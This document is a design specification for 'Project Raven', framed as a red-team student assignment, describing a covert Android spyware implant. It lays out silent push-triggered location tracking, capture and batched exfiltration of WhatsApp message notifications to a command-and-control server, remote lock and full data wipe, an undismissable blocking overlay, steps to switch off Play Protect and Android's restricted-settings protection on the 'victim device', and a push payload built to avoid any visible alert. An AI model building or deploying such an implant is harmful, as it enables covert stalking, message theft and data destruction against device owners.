PROJECT RAVEN: Red Team Android Implant & Control Suite

Classification: Academic / Red Team Assessment

Target OS: Android 12 - 14 (Lab Environment)

Architecture: Push-Based / Silent-Resident

1. Executive Summary

Project Raven is a custom Android surveillance and control implant designed to demonstrate the capabilities of a "sleeping" agent. Unlike traditional parental control apps that maintain a persistent foreground notification to stay alive, Raven utilizes a "Wake-on-LAN" architecture powered by Firebase Cloud Messaging (FCM). This allows the application to remain cached (0% CPU, 0% Network) until a specific high-priority command is issued from the Command & Control (C2) server.

This document outlines the technical specifications, evasion strategies, and implementation roadmap for the "Red Team" assignment.

2. System Architecture

2.1 High-Level Design

The system avoids constant polling (HTTP GET /commands) which is noisy and drains battery. Instead, it relies on Google's infrastructure to deliver payloads.

State: DORMANT (Default)

App process is cached or killed by OS.

No active services, no visible notifications.

Battery impact: Negligible.

State: ACTIVE (Triggered)

Trigger: C2 Server sends high-priority FCM Data Message.

Action: FirebaseMessagingService wakes up.

Execution: Service acquires WakeLock, performs task (e.g., GPS fix), uploads result, and calls stopSelf().

2.2 Data Flow Diagram

[Admin Dashboard] --(JSON Command)--> [FCM Server]
                                          |
                                     (High Priority Push)
                                          |
                                          v
[Target Device] <--(Wake Up)-- [Android System]
      |
      +--> [Raven Service] --(Execute)--> [GPS/Notifs/Wipe]
                  |
                  +--(Upload Data)--> [C2 Listener URL]


3. Feature Specifications & Implementation Logic

3.1 Module: Core Connectivity (Auto-Connect)

Objective: Eliminate user setup (QR codes/Login).

Mechanism: Hardcoded identity within the APK.

Logic:

On Application.onCreate(), check Prefs.isRegistered.

If false, read AppConfig.OWNER_ID and AppConfig.API_KEY.

Send one-time "I am alive" beacon to C2.

Save Prefs.isRegistered = true.

3.2 Module: Silent Location (On-Demand)

Permission: ACCESS_BACKGROUND_LOCATION.

Logic:

FCM Command: {"cmd": "GET_LOCATION"}.

Service: Requests FusedLocationProviderClient.getCurrentLocation().

Constraint: Must complete within 10 seconds before the system kills the service.

Fallback: If GPS fails, return last known location.

3.3 Module: Notification Mirroring (WhatsApp Reader)

Permission: BIND_NOTIFICATION_LISTENER_SERVICE.

Logic:

NotificationListenerService runs in background (low footprint).

Interceptor: onNotificationPosted(sbn) captures:

package: com.whatsapp

title: Contact Name

text: Message Body

Storage: Do NOT upload instantly (noisy). Insert into local SQLite database.

Exfiltration: Wait for FCM Command {"cmd": "SYNC_LOGS"} to batch upload and clear DB.

3.4 Module: App Blocking (No Accessibility)

Objective: Block specific apps (e.g., TikTok) without Accessibility Service.

Mechanism: UsageStatsManager + SYSTEM_ALERT_WINDOW.

Logic:

Monitor: A simplified WorkManager job runs every 1 minute (battery trade-off) OR relies on UsageEvents.

Detection: usageStatsManager.queryUsageStats() identifies the foreground package.

Action: If package == "com.zhiliaoapp.musically" (TikTok):

Launch BlockActivity with Intent.FLAG_ACTIVITY_NEW_TASK.

BlockActivity is a full-screen red overlay that cannot be dismissed (back button disabled).

3.5 Module: Remote Control (Lock/Wipe)

Permission: BIND_DEVICE_ADMIN.

Logic:

FCM Command: {"cmd": "LOCK_NOW"} -> dpm.lockNow().

FCM Command: {"cmd": "WIPE_DATA"} -> dpm.wipeData(0).

4. Security Evasion & Lab Setup (Red Team Strategy)

Since this is a student assignment running on a lab device, we will manually bypass the OS protections that would normally block a play-store malware.

4.1 Bypassing "Restricted Settings"

Problem: Android 13+ blocks "Notification Listener" for sideloaded APKs.

Lab Bypass:

Install app-debug.apk.

Go to Settings > Apps > Raven.

Tap 3-Dots Menu (Top Right) > Allow Restricted Settings.

Now the app can programmatically request the permission without crashing.

4.2 Bypassing "Background Start" Restrictions

Problem: Services cannot launch Activities (like the Block Screen) from the background.

Lab Bypass: Grant "Display over other apps" (SYSTEM_ALERT_WINDOW) permission manually. This allows the BlockActivity to interrupt the user.

4.3 Bypassing Play Protect

Problem: Heuristics will flag the app as "Spyware" due to permission combinations.

Lab Bypass: Disable Play Protect in the Play Store settings on the victim device.

5. Implementation Plan (Live Code Session)

Phase 1: The Skeleton (15 Mins)

Create Project "Raven".

Add AppConfig.java (Hardcoded credentials).

Add google-services.json (Firebase).

create MyFirebaseMessagingService class.

Phase 2: The "Wake-Up" Logic (20 Mins)

Implement onMessageReceived in the service.

Add Switch/Case statement for commands (LOCATION, PING).

Test with Postman: Send JSON payload -> Verify Logcat output.

Phase 3: The Eyes (30 Mins)

Add LocationManager logic.

Add NotificationListener service.

Implement the "Restricted Settings" bypass flow (UI Dialog asking user to go to settings).

Phase 4: The Shield (Blocking) (20 Mins)

Create BlockActivity (Red screen, "Get back to work!").

Implement UsageStats check.

Logic: If (TikTok is Open) -> startActivity(BlockActivity).

6. Server Payload Reference

To wake the device, send this JSON to https://fcm.googleapis.com/fcm/send:

{
  "to": "<DEVICE_TOKEN>",
  "priority": "high",
  "content_available": true,
  "data": {
    "action": "COMMAND",
    "type": "GET_LOCATION",
    "requires_upload": "true"
  }
  // NOTE: Do NOT include "notification" key, or a system tray alert will appear.
}
